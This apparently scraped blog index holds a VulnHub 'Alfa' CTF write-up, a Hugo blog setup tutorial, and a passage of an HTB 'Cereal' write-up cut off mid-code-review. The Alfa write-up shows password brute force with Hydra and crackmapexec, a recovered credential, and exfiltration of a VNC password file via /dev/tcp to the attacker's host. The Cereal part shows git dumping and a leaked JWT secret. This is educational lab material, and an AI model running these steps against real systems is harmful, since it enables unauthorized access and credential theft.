(Status: 301) [Size: 311] [--\u0026gt; http://192.168.2.109/js/] /images (Status: 301) [Size: 315] [--\u0026gt; http://192.168.2.109/images/] /css (Status: 301) [Size: 312] [--\u0026gt; http://192.168.2.109/css/] /index.html (Status: 200) [Size: 3870] /fonts (Status: 301) [Size: 314] [--\u0026gt; http://192.168.2.109/fonts/] /robots.txt (Status: 200) [Size: 459] /server-status (Status: 403) [Size: 278] robots.txt Accessing robots.txt discovers some directories. But, these are just dummy.\nPoking the robots.txt file with curl discovers a string which looks like a brainfuck language.\n→ root@iamf «alfa» «192.168.2.103» $ curl -s http://192.168.2.109/robots.txt /home #404 /admin #404 /login #404 /images #200, directory listing, nothing interesting /cgi-bin #404 /intranet #404 /wp-admin #404 /wp-login #404 ...\u0026lt;SNIP\u0026gt;... ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;+++++++++++++++++.\u0026gt;\u0026gt;---.+++++++++++.------.-----.\u0026lt;\u0026lt;--.\u0026gt;\u0026gt;++++++++++++++++++.++.-----..-.+++.++. The string is translated as /alfa-support on site,\n/alfa-support On /alfa-support, there is a chat between Thomas as the employee and the IT support operator (I think?).\nFrom the conversation above, I\u0026rsquo;ll note that Thomas uses a password that consists of his(or her?) pet\u0026rsquo;s name followed by 3 numerical digits.\nFoothold Shell as Thomas Creating Wordlist From the previous FTP enumeration, \u0026lsquo;milo\u0026rsquo; is most likely the name of Thomas\u0026rsquo;s pet. With bash, I could generate all the possible password used by Thomas.\n→ root@iamf «alfa» «192.168.2.103» $ for i in {000..999}; do echo \u0026#34;milo$i\u0026#34;; done | tee passwords milo000 milo001 milo002 milo003 ...\u0026lt;snip\u0026gt;... Brute force - FTP I tried it with Hydra on FTP but returns nothing.\nroot@iamf «alfa» «192.168.2.103» $ hydra -l thomas -P passwords ftp://192.168.2.103 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-22 03:43:09 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task [DATA] attacking ftp://192.168.2.103:21/ [STATUS] 320.00 tries/min, 320 tries in 00:01h, 713 to do in 00:03h, 16 active [STATUS] 317.00 tries/min, 634 tries in 00:02h, 399 to do in 00:02h, 16 active [STATUS] 315.67 tries/min, 947 tries in 00:03h, 86 to do in 00:01h, 16 active 1 of 1 target completed, 0 valid passwords found [WARNING] Writing restore file because 15 final worker threads did not complete until end. [ERROR] 15 targets did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-22 03:46:35 Brute force - SSH This time, I divided the wordlist into two files.\n passwords1: 000-500 passwords2: 500-999  And I\u0026rsquo;ll use crackmapexec:\n→ root@iamf «alfa» «192.168.2.103» $ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port 65111 After some minutes it returns one valid combination: thomas:milo666\nSSH - Thomas I\u0026rsquo;ll just log in via SSH and grabs the flag.\n→ root@iamf «alfa» «192.168.2.103» $ ssh -p 65111 thomas@192.168.2.109 thomas@192.168.2.109\u0026#39;s password: Linux Alfa 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 #################################################################### # ,---------------------------, # # | /---------------------\\ | # # | | | | # # | | +----+ | | # # | | |ALFA| | | # # | | +----+ | | # # | | | | # # | \\_____________________/ | # # |___________________________| # # ,---\\_____ [] _______/------, # # / /______________\\ /| # # /___________________________________ / | ___ # # | | | ) # # | _ _ _ [-------] | | ( # # | o o o [-------] | / _)_ # # |__________________________________ |/ / / # # /-------------------------------------/| ( )/ # # /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ / # # /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ / # # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ # # ██╗ ██╗███████╗██╗ ██████╗ ██████╗ ███╗ ███╗███████╗ # # ██║ ██║██╔════╝██║ ██╔════╝██╔═══██╗████╗ ████║██╔════╝ # # ██║ █╗ ██║█████╗ ██║ ██║ ██║ ██║██╔████╔██║█████╗ # # ██║███╗██║██╔══╝ ██║ ██║ ██║ ██║██║╚██╔╝██║██╔══╝ # # ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗ # # ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝ # #################################################################### thomas@Alfa:~$ id uid=1000(thomas) gid=1000(thomas) grupos=1000(thomas),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) thomas@Alfa:~$ ls -l total 4 -rw-r--r-- 1 thomas thomas 1332 dic 20 11:04 user.txt Privilege Escalation Shell as root Internal enumeration In thomas\u0026rsquo;s home directory, there is a file called .remote-secret and it is owned by root but world-writable.\nthomas@Alfa:~$ ls -la total 40 drwxr-xr-x 4 thomas thomas 4096 dic 20 22:22 . drwxr-xr-x 3 root root 4096 dic 16 07:58 .. -rw------- 1 thomas thomas 4 dic 20 22:22 .bash_history -rw-r--r-- 1 thomas thomas 220 dic 16 07:58 .bash_logout -rw-r--r-- 1 thomas thomas 3526 dic 16 07:58 .bashrc drwx------ 3 thomas thomas 4096 dic 16 21:15 .gnupg drwxr-xr-x 3 thomas thomas 4096 dic 16 20:44 .local -rw-r--r-- 1 thomas thomas 807 dic 16 07:58 .profile -rwxrwxrwx 1 root root 16 dic 17 23:35 .remote_secret -rw-r--r-- 1 thomas thomas 1332 dic 20 11:04 user.txt At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.\nthomas@Alfa:~$ cat .remote_secret �\u0026#34;�Cc�\u0026#34;�Cc Running pspy discovers a VNC server running locally with root access on port 5901.\n2021/04/22 10:47:57 CMD: UID=0 PID=404 | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth VNC Decrypt This .remote_secret is a VNC password file and I could use vncpwd to decrypt it (I\u0026rsquo;ve also done this previously on HTB: Cascade). I\u0026rsquo;ll transfer the file to my attacking machine and decrypt it there.\nOn Alfa:\nthomas@Alfa:~$ cat .remote_secret \u0026gt; /dev/tcp/192.168.2.103/9000 On my Kali:\n→ root@iamf «alfa» «192.168.2.103» $ nc -nvlp 9000 \u0026gt; remote_secret listening on [any] 9000 ... connect to [192.168.2.103] from (UNKNOWN) [192.168.2.109] 57532 The file content is decrypted to k!LL3rSs\n→ root@iamf «alfa» «192.168.2.103» $ ./vncpwd remote_secret Password: k!LL3rSs I tried the password on root, but it didn\u0026rsquo;t work. Last option here is to access the VNC server.\nAccessing VNC Since the VNC server is not accessible from outside, I\u0026rsquo;ll need a port forwarding to interact with it.\nOn thomas\u0026rsquo;s session\nthomas@Alfa:~$ ~C ssh\u0026gt; -L 5901:localhost:5901 Forwarding port. That will create a tunnel from my Kali localhost:5901 =\u0026gt; Alfa\u0026rsquo;s localhost:5901\nNow I can try to connect to the VNC server using vncviewer (it\u0026rsquo;s preinstalled on Kali) and provide remote_secret as the password file.\n→ root@iamf «alfa» «192.168.2.103» $ vncviewer -passwd remote_secret 127.0.0.1:5901 Connected to RFB server, using protocol version 3.8 Performing standard VNC authentication Authentication successful Desktop name \u0026#34;Alfa:1 (root)\u0026#34; VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using default colormap which is TrueColor. Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Same machine: preferring raw encoding It opens this Windows, and I\u0026rsquo;m already on root.\nTo be honest, this is actually guessing.\nAt first I doubt that this remote_secret is shared with root user, but that\u0026rsquo;s how I pwned this machine.\n References  https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc  ","permalink":"https://fahmifj.github.io/writeups/vulnhub/vh-alfa/","summary":"Alfa starts with enumeration on FTP to obtain a username and an image file, and the image file is named after the user\u0026rsquo;s pet. Alfa\u0026rsquo;s website has a robots.txt file which contains an obfuscated web path to intranet chat support. The chat conversation reveals sensitive information, and with this, I\u0026rsquo;m able to guess the user\u0026rsquo;s password and gain a foothold on the system. In the user\u0026rsquo;s home directory, there is a VNC password and it can be used to log into the currently running VNC server as root.","tags":["OSCP-like","Linux","Brainfuck","Brute-force","Hydra","Tunneling","VNC","vncpwd","vncviewer"],"title":"VulnHub - Alfa"},{"content":"Looking back at my first post in Bahasa Indonesia, I said that I was using Hugo to build this blog. So in this post, I’ll share how to create your own!\nGoals Below are the main goals of this post:\n Installing Hugo Using Hugo theme Deploying Hugo site with Github  Prerequisites There are some prerequisites needed to accomplish these goals:\n A GitHub account Git Bash for Windows users Basics knowledge of Git (commit, push, pull, creating repository, know what is local and remote repository) Basics knowledge/use of CLI (cd, ls, pwd, mv, rm, mkdir)  If all set, then let\u0026rsquo;s get started\nInstalling Hugo First, download Hugo executable binary at:\n https://github.com/gohugoio/hugo/releases  Pick your Hugo version according to what OS you’re on. There is also the extended version, which you should use if you’re building your own theme or picking a theme that uses Sass/SCSS.\nI will assume that you have downloaded the binary and extracted it somewhere on your system.\n$ ls -l total 47488 -rw-r--r-- 1 Fahmi FJ 197121 11357 Mar 22 00:17 LICENSE -rw-r--r-- 1 Fahmi FJ 197121 12345 Mar 22 00:17 README.md -rwxr-xr-x 1 Fahmi FJ 197121 48599040 Mar 22 01:04 hugo.exe Let\u0026rsquo;s test it on terminal by typing:\n$ hugo.exe version hugo v0.82.0-9D960784+extended windows/amd64 BuildDate=2021-03-21T17:28:04Z VendorInfo=gohugoio At this time, Hugo’s binary is not available in a system-wide (it’s not accessible outside the current directory).\nSo, let\u0026rsquo;s make it accessible from anywhere by adding the binary location to what is known as PATH variable.\nWindows For Windows users, let\u0026rsquo;s create a folder called bin in C:/ .\nC:\\\u0026gt;mkdir bin Once the folder is created, move your Hugo binary into it.\nC:\\\u0026gt;dir bin Volume in drive C is Windows Volume Serial Number is AC06-7D93 Directory of C:\\bin 13/06/2021 08:07 \u0026lt;DIR\u0026gt; . 13/06/2021 08:07 \u0026lt;DIR\u0026gt; .. 22/03/2021 01:04 48.599.040 hugo.exe 1 File(s) 48.599.040 bytes 2 Dir(s) 57.909.837.824 bytes free After that, hit Win + R on your keyboard and type:\nrundll32.exe sysdm.cpl,EditEnvironmentVariables You should see a window with \u0026ldquo;Environment Variables\u0026rdquo; in the title. We\u0026rsquo;re going to edit Path variable, so select that Path variable and click on Edit button.\nOn the Edit window, click on New button to add a new path and type C:\\bin.\nAfter that, just hit all the OK button.\nRe-open your Windows terminal and run hugo version. If it returns the same output as previous one, then go to the next section.\nLinux  I know those who use Linux probably already know how to 😁.\n For Linux users, let\u0026rsquo;s create a folder called bin under /home/username/.local/[here].\n$ mkdir -p ~/.local/bin Open your .bashrc or .zshrc file, it is located at /home/username/.[zsh|bash]rc, with your favorite text editor such as vim and simply add these lines at the top of your .bashrc/.zshrc\nPATH_HUGO=\u0026#39;/home/username/.local/bin\u0026#39; export PATH=$PATH_HUGO:$PATH Reopen your terminal and run hugo version from any directory and see if it\u0026rsquo;s returns the version.\nCreating Your First Site We can create a site from anywhere by issuing the following command:\n$ hugo new site [site-name]  I recommend you to create a site in a specific folder such as workspace.\n For now, let\u0026rsquo;s create a site called my-blog.\n$ hugo new site my-blog Congratulations! Your new Hugo site is created in C:\\Users\\fahmi\\Desktop\\test\\my-blog. Just a few more steps and you\u0026#39;re ready to go: 1. Download a theme into the same-named folder. Choose a theme from https://themes.gohugo.io/ or create your own with the \u0026#34;hugo new theme \u0026lt;THEMENAME\u0026gt;\u0026#34; command. 2. Perhaps you want to add some content. You can add single files with \u0026#34;hugo new \u0026lt;SECTIONNAME\u0026gt;\\\u0026lt;FILENAME\u0026gt;.\u0026lt;FORMAT\u0026gt;\u0026#34;. 3. Start the built-in live server via \u0026#34;hugo server\u0026#34;. Visit https://gohugo.io/ for quickstart guide and full documentation. You can see that Hugo creates a new folder called my-blog at C:\\Users\\fahmi\\Desktop\\test\\my-blog, and my-blog has the following directory structure:\nmy-blog ├── archetypes │ └── default.md ├── config.toml ├── content ├── data ├── layouts ├── static └── themes Go to the my-blog folder and type hugo server in the terminal to host it locally.\n$ cd my-blog $ hugo server By default, the site is hosted at http://localhost:1313/ , but it\u0026rsquo;ll be empty because we haven\u0026rsquo;t added any content yet.\nInstalling Hugo Theme My blog uses a theme called PaperMod, so l\u0026rsquo;ll be using that here, too.\nFirst, let\u0026rsquo;s delete the previous my-blog and recreate it with the following command:\n$ hugo new site my-blog -f yml Let\u0026rsquo;s move into my-blog and initialize a git repository there.\n$ cd my-blog $ git init After that, go to the themes folder and clone the PaperMod theme there.\n$ cd themes $ git clone https://github.com/adityatelange/hugo-PaperMod PaperMod --depth=1 We’ll add the theme as a submodule of my-blog.\n$ git submodule add https://github.com/adityatelange/hugo-PaperMod.git PaperMod Now, let\u0026rsquo;s go back to the root directory (my-blog), then replace/overwrite our config.yml with this, but change the value of baseUrl and theme to these:\nbaseURL: \u0026#34;\u0026#34; theme: PaperMod Test it with:\n$ hugo server Creating Your First Post We can create a new post with by issuing the following command:\n$ hugo new post/new-post.md You can edit new-post.md after that, the file should be under my-blog/content/post/[here].\n$ ls -l my-blog/content/post/ total 1 -rw-r--r-- 1 Fahmi FJ 197121 70 Jun 13 09:34 my-post.md To see your post in the site, change the value draft from true to false:\n--- title: \u0026#34;My Post\u0026#34; date: 2021-06-13T09:34:43+07:00 draft: false --- My first post It should be on your site now.\nDeploying Site on GitHub From here, thing you need to know that when you run hugo server, Hugo will generate all the site resources and serve them from memory. But, if you run hugo, Hugo will generates all the site resources inside public folder (my-blog/public/[here]).\nThe files in this public folder are the files that we are going to host on GitHub. We can simply upload all the files in the public folder into a GitHub repository.\nI\u0026rsquo;m not good at explaining it on English, so let\u0026rsquo;s do that in action!\nBut, before that, you have to change your site\u0026rsquo;s base URL in config.yml to:\nbaseURL: \u0026#34;https://[your_user_name].github.io/my-blog/\u0026#34; For example, my username is fahmifj , so my config would be:\nbaseURL: \u0026#34;https://fahmifj.github.io/my-blog/\u0026#34; Once you done with the config, type hugo at the site root directory, Hugo will re-generates the web files at the public folder.\n$ hugo Start building sites … | EN | FR | FA -------------------+----+----+----- Pages | 14 | 10 | 10 Paginator pages | 0 | 0 | 0 Non-page files | 0 | 0 | 0 Static files | 0 | 0 | 0 Processed images | 0 | 0 | 0 Aliases | 3 | 0 | 1 Sitemaps | 2 | 1 | 1 Cleaned | 0 | 0 | 0 Total in 147 ms After that, create a new repository called my-blog on GitHub.\nOnce the repo is created, click on Upload an existing file.\nThen simply drag and drop all the files from the public folder there.\nOnce all the files are uploaded, commit the changes, I\u0026rsquo;ll leave the commit message as default.\nAfter that, go the GitHub pages settings at https://github.com/your-username/my-blog/settings/pages to host your site.\nThere you go!\nIf you don\u0026rsquo;t see your site there or it returns a 404 error, then just wait for a few minutes more.\nFrom here, we learned how to deploy/host our Hugo site on GitHub. However, this is not an efficient method of updating your site, therefore let\u0026rsquo;s write a deployment script.\nDeployment Script Assuming you\u0026rsquo;re inside my-blog , then go to the public directory, do files and folders clean up then initialize a git repository there.\n$ cd public $ rm -rf * $ git init Still inside the public directory, set the previously created my-blog repository as the remote repository and run git pull afterwards.\n$ git remote add origin https://github.com/your-username/my-blog.git $ git pull origin main Return to the site root directory then add the public folder as a submodule.\n$ cd ../ $ git submodule add https://github.com/your-username/my-blog.git public Now let\u0026rsquo;s create a deployment script at the site root directory and name it as deploy.sh:\n#!/bin/bash  echo -e \u0026#34;\\033[0;32mDeploying blog to GitHub...\\033[0m\u0026#34; # Clean public folder hugo --cleanDestinationDir # Go to to public folder cd public/ # Add untracked files, hide output git add -A \u0026gt; /dev/null # Generate a fixed commit message with date and time msg=\u0026#34;[`date \u0026#34;+%R %d-%h-%Y\u0026#34;]` Site update\u0026#34; # Check for additional commit message read -p \u0026#34;Add commit message: \u0026#34; add_msg if [ \u0026#34;$add_msg\u0026#34; != \u0026#34;\u0026#34; ] then msg=\u0026#34;$msg- $add_msg\u0026#34; fi git commit -m \u0026#34;$msg\u0026#34; # Deploy git push -u origin main # Go back to the root directory cd ../ In Windows, even though it is a bash script, it will work with Git Bash.\nLet\u0026rsquo;s test it by creating a new post.\n$ hugo new post/second-post.md $ echo \u0026#39;This is second post\u0026#39; \u0026gt;\u0026gt; content/post/second-post.md Don\u0026rsquo;t forget to change the value of draft from true to false!\nNow we can run the script, the output should looks something like this:\n(my-blog)$ ./deploy.sh Deploying blog to GitHub... Start building sites … | EN | FR | FA -------------------+----+----+----- Pages | 15 | 10 | 10 Paginator pages | 0 | 0 | 0 Non-page files | 0 | 0 | 0 Static files | 0 | 0 | 0 Processed images | 0 | 0 | 0 Aliases | 3 | 0 | 1 Sitemaps | 2 | 1 | 1 Cleaned | 0 | 0 | 0 Total in 155 ms Add commit message: [main af4c483] [11:00 13-Jun-2021] Site update 9 files changed, 459 insertions(+), 8 deletions(-) create mode 100644 post/second-post/index.html Enumerating objects: 27, done. Counting objects: 100% (27/27), done. Delta compression using up to 8 threads Compressing objects: 100% (13/13), done. Writing objects: 100% (15/15), 3.54 KiB | 1.77 MiB/s, done. Total 15 (delta 9), reused 0 (delta 0), pack-reused 0 remote: Resolving deltas: 100% (9/9), completed with 7 local objects. To https://github.com/fahmifj/my-blog.git f7141a3..af4c483 main -\u0026gt; main Branch \u0026#39;main\u0026#39; set up to track remote branch \u0026#39;main\u0026#39; from \u0026#39;origin\u0026#39;. If we check our repo it should be updated.\nThat\u0026rsquo;s how I deployed my blog at the first time.\nBut still, this is inefficient method because it wastes your bandwidth, thus in the next post, let\u0026rsquo;s employ GitHub action 😼.\nIn the meantime, try reading the following documentations:\n https://gohugo.io/content-management/sections/ https://gohugo.io/content-management/front-matter/ https://gohugo.io/content-management/page-bundles/ https://gohugo.io/content-management/urls/  ","permalink":"https://fahmifj.github.io/blog/hugo-setup-and-deployment/","summary":"Looking back at my first post in Bahasa Indonesia, I said that I was using Hugo to build this blog. So in this post, I’ll share how to create your own!\nGoals Below are the main goals of this post:\n Installing Hugo Using Hugo theme Deploying Hugo site with Github  Prerequisites There are some prerequisites needed to accomplish these goals:\n A GitHub account Git Bash for Windows users Basics knowledge of Git (commit, push, pull, creating repository, know what is local and remote repository) Basics knowledge/use of CLI (cd, ls, pwd, mv, rm, mkdir)  If all set, then let\u0026rsquo;s get started","tags":["Hugo","Tutorial"],"title":"Hugo Setup and Deployment"},{"content":"Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application\u0026rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities allows me to gain a foothold in the system.\nSkills Learned  Code review JWT authentication bypass XSS exploitation .NET deserialization Exploit chain  Tools  Kali Linux 2019.4 (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux  Reconnaissance Nmap All TCP ports scan with nmap discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.\n→ root@kali «cereal» «10.10.14.3» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-04 23:45 EDT ...\u0026lt;SNIP\u0026gt;... PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 127 80/tcp open http syn-ack ttl 127 443/tcp open https syn-ack ttl 127 Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds I\u0026rsquo;ll run another scan with nmap \u0026rsquo;s default scripts.\n→ root@kali «cereal» «10.10.14.3» $ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-04 23:51 EDT ...\u0026lt;SNIP\u0026gt;... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac (RSA) | 256 fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac (ECDSA) |_ 256 cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e (ED25519) 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Did not follow redirect to https://cereal.htb/ |_https-redirect: ERROR: Script execution failed (use -d to debug) 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Cereal | ssl-cert: Subject: commonName=cereal.htb | Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb | Not valid before: 2020-11-11T19:57:18 |_Not valid after: 2040-11-11T20:07:19 |_ssl-date: 2021-06-05T03:51:48+00:00; +5s from scanner time. | tls-alpn: |_ http/1.1 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.34 seconds This time nmap found two hostnames from the SSL certificate: cereal.htb and source.cereal.htb.\nI\u0026rsquo;ll add those hostnames to my /etc/hosts:\n→ root@kali «cereal» «10.10.14.3» $ echo \u0026#39;10.10.10.217 cereal.htb source.cereal.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts Enumeration TCP 80 It redirects to the HTTPS.\nTCP 443 - cereal.htb Following the redirection ends up at a login form. I tried a few common credentials, but they didn\u0026rsquo;t work here.\nInspecting the source reveals that this site is a react based application.\nIf I track down the authentication process, this site store the authentication data in browser\u0026rsquo;s local storage with a key name of currentUser, but l\u0026rsquo;ll leave it for now.\nI also did a gobuster scan, but didn\u0026rsquo;t find anything useful.\nTCP 443 - source.cereal.htb Visiting source.cereal.htb shows a server error message of an ASP.net application:\nNothing I can do with this page, but I\u0026rsquo;ll take note on the leaked file path:\n C:\\inetpub\\source\\default.aspx  Gobuster gobuster scan discovers a git repository, and there is also an upload directory.\n→ root@kali «cereal» «10.10.14.3» $ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://source.cereal.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: aspx,txt [+] Timeout: 10s =============================================================== 2021/06/05 00:52:32 Starting gobuster in directory enumeration mode =============================================================== /.git/HEAD (Status: 200) [Size: 23] /Default.aspx (Status: 500) [Size: 10090] /aspnet_client (Status: 301) [Size: 163] [--\u0026gt; https://source.cereal.htb/aspnet_client/] /default.aspx (Status: 500) [Size: 9727] /uploads (Status: 301) [Size: 157] [--\u0026gt; https://source.cereal.htb/uploads/] =============================================================== 2021/06/05 00:54:41 Finished =============================================================== Access to the .git and the uploads directory are forbidden.\n→ root@kali «cereal» «10.10.14.3» $ curl -I -k http://source.cereal.htb/.git/ \u0026amp;\u0026amp; curl -I -k http://source.cereal.htb/uploads/ HTTP/1.1 403 Forbidden Content-Length: 1233 Content-Type: text/html Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:01:25 GMT HTTP/1.1 403 Forbidden Content-Length: 1233 Content-Type: text/html Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:08:16 GMT But requesting files under .git directory are allowed.\n→ root@kali «cereal» «10.10.14.3» $ curl -I -k http://source.cereal.htb/.git/HEAD HTTP/1.1 200 OK Content-Length: 23 Content-Type: text/plain Last-Modified: Wed, 11 Nov 2020 20:09:34 GMT Accept-Ranges: bytes ETag: \u0026#34;adc1d19266b8d61:0\u0026#34; Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:01:29 GMT → root@kali «cereal» «10.10.14.3» $ curl -s -k http://source.cereal.htb/.git/HEAD ref: refs/heads/master I\u0026rsquo;ll note the uploads directory.\nGit Dumping .git directory With git-dumper, I could get all the files in that .git directory.\n→ root@kali «cereal» «10.10.14.3» $ mkdir loot/source-cereal-git \u0026amp;\u0026amp; ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git [-] Testing https://source.cereal.htb/.git/HEAD [200] [-] Testing https://source.cereal.htb/.git/ [403] [-] Fetching common files [-] Fetching https://source.cereal.htb/.gitignore [404] [-] Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample [404] [-] Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG [200] [-] Fetching https://source.cereal.htb/.git/description [200] ...\u0026lt;SNIP\u0026gt;... [-] Finding refs/ [-] Fetching https://source.cereal.htb/.git/ORIG_HEAD [404] [-] Fetching https://source.cereal.htb/.git/config [200] [-] Fetching https://source.cereal.htb/.git/FETCH_HEAD [404] [-] Fetching https://source.cereal.htb/.git/HEAD [200] ...\u0026lt;SNIP\u0026gt;... [-] Finding packs [-] Finding objects [-] Fetching objects [-] Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 [200] ...\u0026lt;SNIP\u0026gt;... [-] Running git checkout . Git History I could see the history of this repository by issuing git log.\nAside from the author\u0026rsquo;s names, one commit with the message \u0026ldquo;Security fixes\u0026rdquo; caught my attention.\nI immediately run git diff 8f2a 7bd9 to compare the first commit with the security fixes and that reveals a deleted JWT secret.\nIt looks like the security fixes include prevention against deserialization attacks which I\u0026rsquo;ll note that as well as the secret:\n JWT secret: secretlhfIH\u0026amp;FY*#oysuflkhskjfhefesf  Source Code Analysis #1  I pointed my sh*tty explanation or at least how I understand it with // \u0026lt;== or # \u0026lt;== in the code snippet. Please, don\u0026rsquo;t bully me for this.\n App Overview The app consist of ASP.NET (back-end) and React (front-end).\n→ root@kali «source-cereal-git» «10.10.14.3» git:(master) $ tree -L 1 --dirsfirst . ├── ClientApp ├── Controllers ├── Migrations ├── Models ├── Pages ├── Properties ├── Services ├── ApplicationOptions.cs ├── appsettings.Development.json ├── appsettings.json ├── CerealContext.cs ├── Cereal.csproj ├── DownloadHelper.cs ├── ExtensionMethods.cs ├── IPAddressHandler.cs ├── IPRequirement.cs ├── Program.cs └── Startup.cs The source code of previously seen React app at cereal.htb is on the ClientApp folder.\nHere is the overview of app execution flow:\nProgram.cs | v Startup.cs -\u0026gt; Loads appsettings.json | v React client Looking into the appsettings.js, I could obtain the following information:\n There is IP whitelist There are two rules that looks like limiting requests and it\u0026rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called /requests.  { ...\u0026lt;SNIP\u0026gt;... \u0026#34;AllowedHosts\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;ApplicationOptions\u0026#34;: { \u0026#34;Whitelist\u0026#34;: [ \u0026#34;127.0.0.1\u0026#34;, \u0026#34;::1\u0026#34; ] }, \u0026#34;IpRateLimiting\u0026#34;: { \u0026#34;EnableEndpointRateLimiting\u0026#34;: true, \u0026#34;StackBlockedRequests\u0026#34;: false, \u0026#34;RealIpHeader\u0026#34;: \u0026#34;X-Real-IP\u0026#34;, \u0026#34;ClientIdHeader\u0026#34;: \u0026#34;X-ClientId\u0026#34;, \u0026#34;HttpStatusCode\u0026#34;: 429, \u0026#34;IpWhitelist\u0026#34;: [ \u0026#34;127.0.0.1\u0026#34;, \u0026#34;::1\u0026#34; ], \u0026#34;EndpointWhitelist\u0026#34;: [], \u0026#34;ClientWhitelist\u0026#34;: [], \u0026#34;GeneralRules\u0026#34;: [ { \u0026#34;Endpoint\u0026#34;: \u0026#34;post:/requests\u0026#34;, \u0026#34;Period\u0026#34;: \u0026#34;5m\u0026#34;, \u0026#34;Limit\u0026#34;: 2 }, { \u0026#34;Endpoint\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Period\u0026#34;: \u0026#34;5m\u0026#34;, \u0026#34;Limit\u0026#34;: 150 } ] } } Authentication Vulnerability Looking into the Startup.cs file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn\u0026rsquo;t validate the issuer and the audience of a JWT token, and this can raise a security issue.\n...\u0026lt;SNIP\u0026gt;... var key = Encoding.ASCII.GetBytes(\u0026#34;*\u0026#34;); services.AddAuthentication(x =\u0026gt; { x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme; x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme; }) .AddJwtBearer(x =\u0026gt; { x.RequireHttpsMetadata = false; x.SaveToken = true; x.TokenValidationParameters = new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = new SymmetricSecurityKey(key), ValidateIssuer = false, // \u0026lt;== No validation  ValidateAudience = false // \u0026lt;== No validation  }; }); ...\u0026lt;SNIP\u0026gt;... The JWT token itself is forged at Services/UserService.cs:\npublic User Authenticate(string username, string password) { using (var db = new CerealContext()) { var user = db.Users.Where(x =\u0026gt; x.Username == username \u0026amp;\u0026amp; x.Password == password).SingleOrDefault(); // return null if user not found  if (user == null) 